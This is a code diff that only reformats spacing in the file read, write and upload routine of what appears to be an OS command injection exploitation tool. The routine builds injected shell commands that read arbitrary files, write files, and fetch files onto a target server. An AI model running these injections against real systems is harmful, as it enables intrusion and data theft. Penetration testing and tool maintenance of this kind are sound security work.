@@ -28,15 +28,15 @@ from src.core.injections.results_based.techniques.eval_based import eb_injector
  The "eval-based" injection technique on Classic OS Command Injection.
 """
 
-def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter):
+def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter):
   
   #  Read file
   if menu.options.file_read:
     file_to_read = menu.options.file_read
     # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
-    shell = eb_injector.injection_results(response,TAG)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+    shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
@@ -60,7 +60,7 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
     if os.path.isfile(file_to_write):
       with open(file_to_write, 'r') as content_file:
         content = [line.replace("\n", " ") for line in content_file]
-      content = "".join(str(p) for p in content).replace("'","\"")
+      content = "".join(str(p) for p in content).replace("'", "\"")
     else:
       sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
       sys.stdout.flush()
@@ -75,14 +75,14 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       
     # Execute command
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
-    shell = eb_injector.injection_results(response,TAG)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+    shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_write + ")"
-    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
-    shell = eb_injector.injection_results(response,TAG)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+    shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     if shell:
@@ -117,14 +117,14 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
-    shell = eb_injector.injection_results(response,TAG)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+    shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_upload + ")"
-    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
-    shell = eb_injector.injection_results(response,TAG)
+    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+    shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     if shell:
